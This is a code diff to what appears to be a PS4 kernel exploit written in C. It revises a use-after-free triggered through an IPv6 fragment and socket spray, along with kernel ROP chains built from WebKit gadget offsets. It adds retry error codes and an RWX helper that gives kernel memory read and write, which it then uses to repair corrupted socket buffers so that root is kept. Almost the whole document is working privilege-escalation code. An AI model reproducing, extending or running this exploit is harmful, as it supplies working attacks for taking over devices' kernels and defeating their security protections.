@@ -20,6 +20,7 @@
 #include <printf/printf.h>
 #include <ps4/errno.h>
 #include <ps4/saveall.h>
+#include <librop/extcall.h>
 
 unsigned long long __builtin_gadget_addr(const char*);
 
@@ -288,7 +289,18 @@ read_fd(int fd, void *ptr, size_t nbytes, int *recvfd, int cnt)
     return(n);
 }
 
-int leak_fds(int* fd_to_leak, uintptr_t* out, int nfds, int bads[3])
+/*
+  error codes:
+  0   no error
+  1   non-fatal error (can retry)
+  2   fatal error (can't retry)
+  179 already exploited
+*/
+
+int* kp_bad_fds;
+int* kp_bad_fds_end;
+
+int leak_fds(int* fd_to_leak, uintptr_t* out, int nfds)
 {
     printf("starting kex...\n");
     printf("fds:");
@@ -318,7 +330,8 @@ int leak_fds(int* fd_to_leak, uintptr_t* out, int nfds, int bads[3])
     nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
     send_fragment(sock, buf, 0, FIRST_FRAGMENT_SZ, 0, 0xdead0002, 43);
     send_fragment(sock, buf, FIRST_FRAGMENT_SZ, sizeof(buf) - FIRST_FRAGMENT_SZ, 1, 0xdead0002, 43);
-    nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xa3\xe1\x11\0\0\0\0", 0);
+    //nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xa3\xe1\x11\0\0\0\0", 0);
+    nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
     for(int i = 0; i < SPRAY_SIZE; i++)
     {
         push_cluster(socks, i);
@@ -335,7 +348,7 @@ int leak_fds(int* fd_to_leak, uintptr_t* out, int nfds, int bads[3])
     if(bad1 < 0)
     {
         printf("leak_fds: no collision\n");
-        return 1;
+        return 2;
     }
     for(int i = 0; i < NUM_UNIX; i++)
         push_big_cluster(un, 2*i);
@@ -357,14 +370,14 @@ int leak_fds(int* fd_to_leak, uintptr_t* out, int nfds, int bads[3])
             if(bad3 != 2*i+1)
             {
                 printf("leak_fds: wrong socket corrupted\n");
-                return 1;
+                return 2;
             }
             printf("fucked up %d\n", i);
             uintptr_t* leak = (uintptr_t*)(buf_final+2048);
             if(leak[0] != __builtin_gadget_addr("dq 0xffff00000000") + (nfds+2)*8 || (unsigned int)leak[1] != 1)
             {
                 printf("leak_fds: unexpected leak content: 0x%llx 0x%llx\n", leak[0], leak[1]);
-                return 1;
+                return 2;
             }
             for(int i = 0; i < nfds; i++)
                 out[i] = leak[i+2];
@@ -377,13 +390,13 @@ int leak_fds(int* fd_to_leak, uintptr_t* out, int nfds, int bads[3])
         if(i != bad1 && i != bad2)
             close(socks[i]);
     close(sock);
-    bads[0] = socks[bad1];
-    bads[1] = socks[bad2];
-    bads[2] = un[bad3];
+    *kp_bad_fds_end++ = socks[bad1];
+    *kp_bad_fds_end++ = socks[bad2];
+    *kp_bad_fds_end++ = un[bad3];
     return 0;
 }
 
-int trigger(int trg_fd, uintptr_t trg_addr, int bad_fds[3], int* sel_cur)
+int trigger(int trg_fd, uintptr_t trg_addr, int* sel_cur)
 {
     printf("starting kex...\n");
     cpuset_t xxx;
@@ -410,7 +423,8 @@ int trigger(int trg_fd, uintptr_t trg_addr, int bad_fds[3], int* sel_cur)
     nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
     send_fragment(sock, buf, 0, FIRST_FRAGMENT_SZ, 0, 0xdead0002, 43);
     send_fragment(sock, buf, FIRST_FRAGMENT_SZ, sizeof(buf) - FIRST_FRAGMENT_SZ, 1, 0xdead0002, 43);
-    nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xa3\xe1\x11\0\0\0\0", 0);
+    //nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xa3\xe1\x11\0\0\0\0", 0);
+    nanosleep((void*)"\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 0);
     for(int i = 0; i < SPRAY_SIZE; i++)
     {
         push_cluster(socks, i);
@@ -427,12 +441,12 @@ int trigger(int trg_fd, uintptr_t trg_addr, int bad_fds[3], int* sel_cur)
     if(bad1 < 0)
     {
         printf("trigger: no collision\n");
-        return 1;
+        return 2;
     }
-    else if(bad1 == 48)
+    else if(bad2 == 48)
     {
         printf("bogus48, restarting...\n");
-        bad_fds[-1] = socks[bad1];
+        *kp_bad_fds_end++ = socks[bad1];
         close(sock);
         for(int i = 0; i < SPRAY_SIZE; i++)
             if(i != bad1)
@@ -460,7 +474,7 @@ int trigger(int trg_fd, uintptr_t trg_addr, int bad_fds[3], int* sel_cur)
     if((uaf_idx & 0xffff0000) != 0xfee10000)
     {
         printf("uaf not exploited, wtf??\n");
-        return 1;
+        return 2;
     }
     uaf_idx &= 0xffff;
     //print_mbuf_addr(socks[bad2]);
@@ -488,12 +502,12 @@ int trigger(int trg_fd, uintptr_t trg_addr, int bad_fds[3], int* sel_cur)
     nanosleep((void*)"\0\0\0\0\0\0\0\0\x00\xe1\xf5\x05\0\0\0\0", 0);
     int ss[32];
     struct pollfd pfd = {.events = POLLIN, .revents = 0};
-    bad_fds[0] = socks[bad1];
-    bad_fds[1] = socks[bad2];
+    *kp_bad_fds_end++ = socks[bad1];
+    *kp_bad_fds_end++ = socks[bad2];
     int bad_un = -1;
     for(int i = 0; i < NUM_UNIX; i++)
     {
-        bad_fds[2] = un[2*i+1];
+        //bad_fds[2] = un[2*i+1];
         if(read_fd(un[2*i+1], &x, 1, fd_to_pass, 32) < 0)
         {
             printf("read_fd failed, wtf??\n");
@@ -504,6 +518,8 @@ int trigger(int trg_fd, uintptr_t trg_addr, int bad_fds[3], int* sel_cur)
             *sel_cur = pfd.fd = fd_to_pass[j];
             poll(&pfd, 1, 0); //kpayload
             close(fd_to_pass[j]);
+            if(*sel_cur == -1)
+                *kp_bad_fds_end++ = un[2*i+1];
         }
     }
     //this code crashes. but if we don't close them explicitly the process will terminate just fine
@@ -614,37 +630,72 @@ extern unsigned long long kp_kernel_base;
 extern unsigned long long kernel_fixup_ret;
 extern unsigned long long kp_decref_fp;
 
-void stack_sanity(void)
+int wrap_trigger(int trg_fd, uintptr_t trg_addr, int* sel_cur)
 {
-    char data[16384];
-    for(int i = 0; i < 16384; i++)
-        data[i] = 0xb3;
-}
-
-int wrap_trigger(int trg_fd, uintptr_t trg_addr, int bad_fds[2], int* sel_cur)
-{
-    stack_sanity();
-    int ans = trigger(trg_fd, trg_addr, bad_fds, sel_cur);
-    if(ans == 48)
-    {
-        stack_sanity();
-        ans = trigger(trg_fd, trg_addr, bad_fds, sel_cur);
-    }
-    if(ans == 48)
-    {
-        printf("bogus48 hit twice, exiting\n");
-        ans = 1;
-    }
+    int ans = 48;
+    while(ans == 48)
+        ans = trigger(trg_fd, trg_addr, sel_cur);
     return ans;
 }
 
-#if 1
-int main()
+char* kexec_helper_rwx = 0;
+extern char kexec_helper_bin[];
+extern char kexec_helper_end[];
+
+void kexec_helper(void* src, void* dst, void* gs0)
 {
-    if(!setuid(0)) //already exploited
-        return 179;
+    if(!kexec_helper_rwx)
+    {
+        kexec_helper_rwx = mmap(0, kexec_helper_end - kexec_helper_bin, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0);
+        for(size_t i = 0; i < kexec_helper_end - kexec_helper_bin; i++)
+            kexec_helper_rwx[i] = kexec_helper_bin[i];
+    }
+    void* args[3] = {src, dst, gs0};
+    rop_call_funcptr(kexec_helper_rwx, 0, &args);
+}
+
+uintptr_t kexec_get_td(void)
+{
+    uint64_t x;
+    kexec_helper(&x, &x, &x);
+    return x;
+}
+
+uintptr_t kexec_read64(uintptr_t ptr)
+{
+    uint64_t ans, td;
+    kexec_helper((void*)ptr, &ans, &td);
+    return ans;
+}
+
+void kexec_write64(uintptr_t ptr, uintptr_t val)
+{
+    uint64_t td;
+    kexec_helper(&val, (void*)ptr, &td);
+}
+
+void fix_fds(int* kp_bad_fds, int nfds)
+{
+    uint64_t td = kexec_get_td();
+    uint64_t fd = kexec_read64(kexec_read64(kexec_read64(td+8)+72));
+    for(int i = 0; i < nfds; i++)
+    {
+        uint64_t sock = kexec_read64(kexec_read64(fd+8*kp_bad_fds[i]));
+        for(int base = 74; base <= 136; base += 62) // socket->so_{rcv,snd}
+        {
+            kexec_write64(sock+4*base, 0); //sb_mb
+            kexec_write64(sock+4*(base+8), (uint32_t)kexec_read64(sock+4*(base+8))); //sb_cc
+            kexec_write64(sock+4*(base+10), (uint32_t)kexec_read64(sock+4*(base+10))); //sb_mbcnf
+        }
+        //fd[kp_bad_fds[i]] = 0;
+    }
+}
+
+int exploit()
+{
+    int suberr;
+    int kp_sel_fd;
     nanosleep("\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0");
-    int kp_bad_fds[7];
     int fd[256];
     char path[] = "/0123456789/common/lib/libkernel.sprx";
     char buf[16];
@@ -657,10 +708,10 @@ int main()
     for(int i = FD_LEAK_SIZE; i < 256; i++)
         close(fd[i]);
     uintptr_t leak[FD_LEAK_SIZE];
-    if(leak_fds(fd, leak, FD_LEAK_SIZE, kp_bad_fds))
+    if((suberr = leak_fds(fd, leak, FD_LEAK_SIZE)))
     {
         printf("leak_fds failed\n");
-        return 1;
+        return suberr;
     }
     for(int i = 0; i < FD_LEAK_SIZE; i++)
         printf("%d %d %p\n", i, fd[i], (void*)leak[i]);
@@ -679,6 +730,8 @@ int main()
     if(low < 0)
     {
         printf("no good socket pair found, aborting\n");
+        for(int i = 0; i < 256; i++)
+            close(fd[i]);
         return 1;
     }
     printf("%d %d\n", low, high);
@@ -780,9 +833,9 @@ int main()
         __builtin_gadget_addr("pop rdi"),
         krop2+32,
         __builtin_gadget_addr("mov [rdi], rax"),
-        //call C payload
+        //call fixup.rop
         __builtin_gadget_addr("pop rdi"),
-        kp_bad_fds,
+        &kp_sel_fd,
         __builtin_gadget_addr("pop r8"),
         0, //krop2+32
         __builtin_gadget_addr("pop rsp"),
@@ -883,29 +936,31 @@ int main()
     dead[1] = rdi;
     dead[4] = __builtin_gadget_addr("$webkit_base + 0x1480be2"); //mov rdi, [rax + 8] ; mov rax, [rdi] ; jmp [rax + 0x68]
     /* end krop stuff */
-    kp_bad_fds[3] = kp_bad_fds[2];
-    if(wrap_trigger(fd[high], leak[low] + 0x1b, kp_bad_fds+4, kp_bad_fds+7))
+    if((suberr = wrap_trigger(fd[high], leak[low] + 0x1b, &kp_sel_fd)))
     {
         printf("trigger failed\n");
         printf("%d\n", setuid(0));
-        return 1;
+        return suberr;
     }
     if(magic == 0xdeadbeef)
     {
         printf("exploit reports success but krop did not run, wtf??\n");
-        return 1;
+        return 2;
     }
     printf("exploit done: 0x%x 0x%llx 0x%llx\n", magic, ud_dump[0], ud_dump[1]);
     printf("%d\n", setuid(0));
     return 0;
 }
 
-#else
-
 int main()
 {
-    int kp_bad_fds[7];
-    return wrap_trigger(123, 123, kp_bad_fds+4, kp_bad_fds+7);
+    if(!setuid(0)) //already exploited
+        return 179;
+    kp_bad_fds = kp_bad_fds_end = mmap(0, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    int ans;
+    while((ans = exploit()) == 1);
+    if(ans)
+        return ans;
+    fix_fds(kp_bad_fds, kp_bad_fds_end-kp_bad_fds);
+    return 0;
 }
-
-#endif
